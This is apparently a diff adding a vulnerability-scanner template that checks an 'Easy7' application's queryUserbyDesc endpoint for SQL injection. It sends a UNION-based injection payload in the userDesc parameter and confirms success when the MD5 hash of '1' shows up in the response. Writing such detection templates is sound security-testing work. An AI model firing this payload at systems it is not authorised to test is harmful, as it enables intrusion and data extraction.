@@ -1,0 +1,20 @@
+id: Easy7-queryUserbyDesc-sqli
+info:
+  name: Easy7-queryUserbyDesc-sqli
+  author: lemonlove7
+  severity: high
+http:
+  - raw:
+      - |-
+        GET /Easy7/rest/user/queryUserbyDesc?userDesc=1'+UNION+ALL+SELECT+CONCAT(0x7e,MD5(1),0x7e),41,41--+- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.1550.56 Safari/537.36
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - c4ca4238a0b923820dcc509a6f75849b
+    matchers-condition: and
